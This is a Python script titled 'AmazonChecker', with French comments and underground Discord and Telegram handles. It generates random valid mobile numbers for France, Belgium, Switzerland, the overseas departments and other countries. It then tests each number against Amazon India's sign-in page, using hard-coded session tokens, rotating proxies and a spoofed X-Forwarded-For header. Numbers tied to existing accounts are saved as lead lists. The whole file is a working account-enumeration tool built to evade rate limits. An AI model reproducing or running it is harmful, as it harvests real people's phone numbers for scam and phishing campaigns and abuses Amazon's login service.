import requests, urllib3
from multiprocessing import Pool
import os
import random
import phonenumbers
import fade
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed
import logging
import time

# Configuration du logging
logging.basicConfig(filename="error.log", level=logging.ERROR,
                    format='%(asctime)s:%(levelname)s:%(message)s')

# Désactivation des avertissements SSL
requests.packages.urllib3.disable_warnings()

os.system("cls" if os.name == "nt" else "clear")
os.system('title AmazonChecker ^| by @eboy.uhq')

method = "Semi Spoofed"

banner = """
    _                                      ____ _               _             
   / \\   _ __ ___   __ _ _______  _ __    / ___| |__   ___  ___| | _____ _ __ 
  / _ \\ | '_ ` _ \\ / _` |_  / _ \\| '_ \\  | |   | '_ \\ / _ \\/ __| |/ / _ \\ '__|
 / ___ \\| | | | | | (_| |/ / (_) | | | | | |___| | | |  __/ (__|   <  __/ |   
/_/   \\_\\_| |_| |_|\\__,_/___\\___/|_| |_|  \\____|_| |_|\\___|\\___|_|\\_\\___|_|   discord : @eboy.uhq
"""

tatt = """
   .  .    '    .          '                      . 
                 .             '          o     o *     ' +                             
           o     '   . .   .          '           '                               +     
            '        +    '                             +                     '        +
        .                                          .   '                        
      '                    ~~+               '       .  '                       
  '      +                                .                     '                
       |    .      o                                  .    .:'                  
 .     |         |  .      .                          (_.'       +             .   
                -+-     o     o       .                             .               . 
    .        .   |                   '      '  +            o    ~~+              
     +             *             .       @Testeur2cc                 .             +     
    '          .         .             +            .                             .    
                    _|_'        '         .    .-.                             *   
       .    +        |           '         +    ) )      .                       t.me/chez8675  <3     
              +  ( (                                                            
.       +   '     `-'                                     .                        
. +              .             +           +  .    +    +   
[1] generer de la NL
[2] check un numero de tel
[3] check fichier
"""

faded_text = fade.fire(banner)
tatt2 = fade.fire(tatt)
print(faded_text)
print(tatt2)


def load_proxies(file_path):
    proxies = []
    if os.path.exists(file_path):
        with open(file_path, "r") as f:
            for line in f:
                proxy = line.strip()
                # Ajoute "http://" si le schéma est absent
                if proxy and not proxy.startswith("http"):
                    proxy = "http://" + proxy
                proxies.append(proxy)
    return proxies

def validate_proxy(proxy):
    # Création du dictionnaire de proxies en séparant http et https
    proxy_type = "http" if proxy.startswith("http://") else "https"
    proxies = {proxy_type: proxy}
    
    # Utiliser un timeout court pour accélérer la vérification
    timeout = 5
    
    # Utiliser une seule URL de test fiable
    test_url = "http://httpbin.org/ip" if proxy_type == "http" else "https://httpbin.org/ip"
    
    try:
        response = requests.get(test_url, proxies=proxies, timeout=timeout, verify=False)
        if response.status_code == 200:
            return True
    except (requests.exceptions.ConnectTimeout, requests.exceptions.ProxyError, requests.exceptions.ReadTimeout):
        # Échec immédiat pour les erreurs de connexion courantes
        pass
    except Exception as e:
        # Journaliser l'erreur sans stack trace complète pour réduire la taille du log
        logging.error(f"Erreur proxy {proxy}: {str(e)}")
    
    return False

# Chargement et validation concurrente des proxies
proxy_list = load_proxies("proxies.txt")
if proxy_list:
    print(f"{len(proxy_list)} proxies loaded")
    valid_proxies = []
    # Augmenter le nombre de workers et limiter le temps total de validation
    max_workers = min(50, os.cpu_count() * 4)  # Plus de workers pour accélérer
    validation_timeout = 30  # Limiter le temps total de validation à 30 secondes
    
    start_time = time.time()
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        # Soumettre tous les proxies pour validation
        future_to_proxy = {executor.submit(validate_proxy, p): p for p in proxy_list}
        
        # Traiter les résultats au fur et à mesure qu'ils arrivent
        for future in as_completed(future_to_proxy):
            p = future_to_proxy[future]
            # Vérifier si le temps de validation total est dépassé
            if time.time() - start_time > validation_timeout:
                print(f"Validation timeout après {validation_timeout} secondes")
                # Annuler les futures restants
                for f in future_to_proxy:
                    if not f.done():
                        f.cancel()
                break
                
            try:
                if future.result():
                    valid_proxies.append(p)
            except Exception:
                # Ne pas logger les erreurs individuelles pour éviter de surcharger le log
                pass
    
    proxy_list = valid_proxies
    print(f"{len(proxy_list)} proxies valid after filtering en {time.time() - start_time:.2f} secondes")
else:
    print("Aucun proxy chargé. avant ratelimit (100k max)")

class Amazon:
    def __init__(self, num):
        self.url = "https://www.amazon.in/ap/signin"
        self.num = num
        self.cookies = {
            "session-id": "262-6899214-0753700", 
            "session-id-time": "2289745062l", 
            "i18n-prefs": "INR", 
            "csm-hit": "tb:6NWTTM14VJ00ZAVVBZ3X+b-36CP76CGQ52N3TB0HZG8|1659025064788&t:1659025064788&adb:adblk_no", 
            "ubid-acbin": "257-4810331-3732018", 
            "session-token": "tyoeHgowknphx0Y/CBaiVwnBiwbhUb1PRTvQZQ+07Tq9rmkRD6bErsUDwgq6gu+tA53K6WEAMwOb3pN4Ti3PSFoo+I/Jt5qIEDEMHIeRo1CrE264ogGDHsjge/CwWUZ9bVZtbo32ej/ZPQdm8bYeu6TQhca+UH7Wm9OOwBGoPl7dfoUk79QLYEz69Tt3ik4zMJom8jfgI227qMPuaMaAsw=="
        }
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "DNT": "1",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://www.amazon.in",
            "Connection": "close",
            "X-Forwarded-For": "127.0.0.1",
            "Referer": "https://www.amazon.in/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.in%2F%3Fref_%3Dnav_ya_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=inflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-User": "?1"
        }
        self.data = {
            "appActionToken": "Aok8C9I71Cr17vp22ONGvDUXR8Yj3D",
            "appAction": "SIGNIN_PWD_COLLECT",
            "subPageType": "SignInClaimCollect",
            "openid.return_to": "ape:aHR0cHM6Ly93d3cuYW1hem9uLmluLz9yZWZfPW5hdl95YV9zaWduaW4=",
            "prevRID": "ape:MzZDUDc2Q0dRNTJOM1RCMEhaRzg=",
            "workflowState": "eyJ6aXAiOiJERUYiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiQTI1NktXIn0.tCHWdlv4kSSigZCZiGfSCYgnReddxq7c0cUpf0dxYqYzWU-ZHIL0mQ.eP-cXQNtVyBr4q_g.fNRQAD5f18IU0nmqT7IwklJZV-_b60As-_dvyVd4MMjDpiMoGFJ0edbmuL8GJKT_BEE7ClwIpUYOtUtejr7v8qCRy4iD6bg_eBRSnTmZiXzVsx4EuL241zhoriZ7FpXS2seG82sx85C2udl1sPRQyKnO1zIqulOCechL_LzBmIRDv9ngzfij-nYmjWrDpZvAXiKCclR9v0UYh_SqjjOIrStMC53AlWjH-hYdDkXWSeTyHchFi9Ij4ndOgJb9tKNucA4_j7Uy-R0wvB9zlwEfQNa3394guXjjz6IR3TVMjw41bySCYbHLf6j5oj-5xh6UZm2CsW7DE5gqbHmlq5Nv8zLvTRTO9HJvM9Wr36R1eDRN.wZAX4qr9VTROJR9qdWbHfw", 
            "email": self.num, 
            "password": "",
            "create": "0"
        }

def genph(nb, prefix, region):
    numbers = []
    # Pour DOM TOM, si prefix est une liste, définir la configuration des préfixes
    if isinstance(prefix, list):
        domtom_config = {
            "+590": {"region": "GP", "pattern": "690"},
            "+594": {"region": "GF", "pattern": "694"},
            "+596": {"region": "MQ", "pattern": "696"},
            "+262": {"region": "RE", "pattern": "692"}
        }
    while len(numbers) < nb:
        if isinstance(prefix, list):
            chosen_prefix = random.choice(prefix)
            conf = domtom_config.get(chosen_prefix, {"region": "GP", "pattern": "690"})
            reg = conf["region"]
            pattern = conf["pattern"]
            candidate = f"{chosen_prefix}{pattern}{random.randint(0, 999999):06d}"
        else:
            chosen_prefix = prefix
            reg = region
            if reg == "BE":
                candidate = f"{chosen_prefix}4{random.choice(['7','8','9'])}{random.randint(1000000, 9999999):07d}"
            elif reg == "FR":
                candidate = f"{chosen_prefix}{random.choice(['6','7'])}{random.randint(10000000, 99999999):08d}"
            elif reg == "CH":
                # Format pour la Suisse: +41 7x xxx xx xx (mobiles)
                candidate = f"{chosen_prefix}7{random.randint(0, 9)}{random.randint(100000, 999999):06d}"
            else:
                candidate = f"{chosen_prefix}{random.randint(600000000, 799999999):09d}"
        try:
            phone_number = phonenumbers.parse(candidate, reg)
            if phonenumbers.is_valid_number(phone_number):
                formatted = phonenumbers.format_number(phone_number, phonenumbers.PhoneNumberFormat.E164)
                if formatted not in numbers:
                    numbers.append(formatted)
        except Exception:
            continue

    with open("NotCheckedNL.txt", "w") as file:
        file.write("\n".join(numbers))
    
    print(f"{len(numbers)} valid numbers generated out of {nb} demanded")
    return numbers

# Fonction pour générer UN candidat
def gen_candidate(prefix, region):
    if isinstance(prefix, list):
        domtom_config = {
            "+590": {"region": "GP", "pattern": "690"},
            "+594": {"region": "GF", "pattern": "694"},
            "+596": {"region": "MQ", "pattern": "696"},
            "+262": {"region": "RE", "pattern": "692"}
        }
        chosen_prefix = random.choice(prefix)
        conf = domtom_config.get(chosen_prefix, {"region": "GP", "pattern": "690"})
        reg = conf["region"]
        pattern = conf["pattern"]
        candidate = f"{chosen_prefix}{pattern}{random.randint(0, 999999):06d}"
    else:
        chosen_prefix = prefix
        reg = region
        if reg == "BE":
            candidate = f"{chosen_prefix}4{random.choice(['7','8','9'])}{random.randint(1000000, 9999999):07d}"
        elif reg == "FR":
            candidate = f"{chosen_prefix}{random.choice(['6','7'])}{random.randint(10000000, 99999999):08d}"
        elif reg == "PT":  
            candidate = f"{chosen_prefix}{random.choice(['91', '92', '93', '96'])}{random.randint(1000000, 9999999):07d}"
        elif reg == "CH":
            # Format pour la Suisse: +41 7x xxx xx xx (mobiles)
            candidate = f"{chosen_prefix}7{random.randint(0, 9)}{random.randint(100000, 999999):06d}"
        else:
            candidate = f"{chosen_prefix}{random.randint(600000000, 799999999):09d}"
    try:
        phone_number = phonenumbers.parse(candidate, reg)
        if phonenumbers.is_valid_number(phone_number):
            formatted = phonenumbers.format_number(phone_number, phonenumbers.PhoneNumberFormat.E164)
            return formatted
    except Exception as e:
        logging.error("Erreur lors de la génération d'un candidat", exc_info=True)
    return None

# Fonction pour générer un batch de candidats sans doublons
def gen_candidate_batch(prefix, region, batch_size=10000):
    batch_set = set()
    while len(batch_set) < batch_size:
        candidate = gen_candidate(prefix, region)
        if candidate is not None:
            batch_set.add(candidate)
    return list(batch_set)

def fun_action(num):
    num = num.strip()
    if num.isnumeric() and "+" not in num:
        num = f"+{num}"
    amazon = Amazon(num)
    amazon.data['email'] = num

    proxies = None
    if proxy_list:
        chosen_proxy = random.choice(proxy_list)
        proxies = {"http": chosen_proxy, "https": chosen_proxy}
        # Réduire les logs pour accélérer l'exécution
        # print(f"Using proxy: {chosen_proxy}")
    try:
        # Réduire le timeout pour accélérer la vérification
        res = requests.post(amazon.url, headers=amazon.headers, cookies=amazon.cookies, data=amazon.data, verify=False, proxies=proxies, timeout=5).text
        # Détermine le fichier de sortie selon le préfixe
        if num.startswith("+590") or num.startswith("+594") or num.startswith("+596") or num.startswith("+262"):
            output_file = "CheckedNL_domtom.txt"
        elif num.startswith("+32"):
            output_file = "CheckedNL_belgique.txt"
        elif num.startswith("+33"):
            output_file = "CheckedNL_france.txt"
        elif num.startswith("+27"):
            output_file = "CheckedNL_afrique_du_sud.txt"
        elif num.startswith("+34"):
            output_file = "CheckedNL_espagne.txt"
        elif num.startswith("+351"):
            output_file = "CheckedNL_portugal.txt"
        elif num.startswith("+49"):
            output_file = "CheckedNL_allemagne.txt"
        elif num.startswith("+41"):
            output_file = "CheckedNL_suisse.txt"
        else:
            output_file = "CheckedNL.txt"
        if "ap_change_login_claim" in res:
            with open(output_file, "a") as ff:
                ff.write(f"{num}\n")
            print(f"\033[32m[+]\033[0m | Method: {method} | {num} | MY")
            return True
        else:
            print(f"\033[31m[-]\033[0m | Method: {method} | {num} | MY")
            return False
    except Exception as e:
        logging.error(f"Erreur lors de la vérification du numéro {num}", exc_info=True)
        print(f"Error for {num}: {e}")
        return False

def watch_file(file_path, max_check_time=None, batch_size=100):
    """Surveille le fichier pour détecter de nouveaux numéros et supprime les doublons.
    
    Args:
        file_path: Chemin du fichier à surveiller
        max_check_time: Temps maximum de vérification en secondes (None = illimité)
        batch_size: Nombre de numéros à vérifier par lot
    """
    checked_numbers = set()
    start_time = time.time()
    print(f"Surveillance du fichier: {file_path}")
    print(f"Temps max de vérification: {max_check_time if max_check_time else 'illimité'} secondes")
    
    while True:
        # Vérifier si le temps maximum est dépassé
        if max_check_time and time.time() - start_time > max_check_time:
            print(f"Temps maximum de vérification ({max_check_time}s) atteint. Arrêt.")
            break
            
        try:
            with open(file_path, "r") as file:
                lines = file.readlines()
            # Supprimer les doublons en conservant l'ordre
            unique_lines = list(dict.fromkeys([line.strip() for line in lines if line.strip()]))
            if len(unique_lines) != len(lines):
                print("Doublons détectés et supprimés dans le fichier.")
                with open(file_path, "w") as file:
                    for line in unique_lines:
                        file.write(line + "\n")
                        
            # Filtrer les numéros non encore vérifiés
            new_numbers = [num for num in unique_lines if num not in checked_numbers]
            if new_numbers:
                # Traiter par lots pour éviter de bloquer trop longtemps
                for i in range(0, len(new_numbers), batch_size):
                    batch = new_numbers[i:i+batch_size]
                    print(f"Vérification du lot {i//batch_size+1}: {len(batch)} numéro(s)")
                    
                    with Pool(processes=min(os.cpu_count() * 2, 8)) as pool:
                        results = pool.map(fun_action, batch)
                    
                    checked_numbers.update(batch)
                    
                    # Vérifier à nouveau le temps après chaque lot
                    if max_check_time and time.time() - start_time > max_check_time:
                        print(f"Temps maximum de vérification ({max_check_time}s) atteint. Arrêt.")
                        return
            else:
                print("Aucun nouveau numéro détecté.")
        except FileNotFoundError:
            print(f"Erreur : le fichier '{file_path}' n'existe pas.")
            
        # Pause plus courte pour être plus réactif
        time.sleep(0.5)

def main():
    choice = input("@hasbateur2cc > ")
    
    if choice == "1":
        print("Choisissez le pays pour la génération des numéros :")
        print("[1] Dom Tom")
        print("[2] Belgique")
        print("[3] France")
        print("[4] Afrique du Sud")
        print("[5] Espagne")
        print("[6] Portugal")
        print("[7] Allemagne")
        print("[8] Suisse")
        country_choice = input("Votre choix : ")
        if country_choice == "1":
            prefix = ["+590", "+594", "+596", "+262"]
            region = None
        elif country_choice == "2":
            prefix = "+32"
            region = "BE"
        elif country_choice == "3":
            prefix = "+33"
            region = "FR"
        elif country_choice == "4":
            prefix = "+27"
            region = "ZA"
        elif country_choice == "5":
            prefix = "+34"
            region = "ES"
        elif country_choice == "6":
            prefix = "+351"
            region = "PT"
        elif country_choice == "7":
            prefix = "+49"
            region = "DE"
        elif country_choice == "8":
            prefix = "+41"
            region = "CH"
        else:
            print("Choix invalide, utilisation de la France par défaut.")
            prefix = "+33"
            region = "FR"
            
        target = int(input("Nombre de numéros validés requis > "))
        valid_count = 0
        total_attempts = 0
        batch_size = target * 100  # taille du batch = nombre de numéros à valider * 100
        
        while valid_count < target:
            print(f"\nGénération d'un batch de {batch_size} numéros...")
            batch = gen_candidate_batch(prefix, region, batch_size)
            print("Vérification du batch...")
            with Pool(processes=os.cpu_count() * 4) as pool:
                for result in pool.imap_unordered(fun_action, batch):
                    total_attempts += 1
                    if result:
                        valid_count += 1
                    if valid_count >= target:
                        pool.terminate()  # Arrêt immédiat des tâches restantes
                        break
            print(f"Batch terminé: Total validés: {valid_count} / {target} après {total_attempts} numéros vérifiés")
        print(f"\nRécapitulatif: {valid_count} numéros validés après {total_attempts} numéros générés.")
    
    elif choice == "2":
        phone_number = input("Entrez le numéro à vérifier : ")
        result = fun_action(phone_number)
        if result:
            print("Le numéro est validé.")
        else:
            print("Le numéro n'est pas validé.")
    
    elif choice == "3":
        file_path = input("Fichier à vérifier: ")
        max_time = input("Temps maximum de vérification en secondes (laisser vide pour illimité): ")
        max_time = int(max_time) if max_time.strip() else None
        batch_size = input("Nombre de numéros à vérifier par lot (défaut: 100): ")
        batch_size = int(batch_size) if batch_size.strip() else 100
        watch_file(file_path, max_time, batch_size)
    
    else:
        print("Choix invalide")
        main()

if __name__ == "__main__":
    main()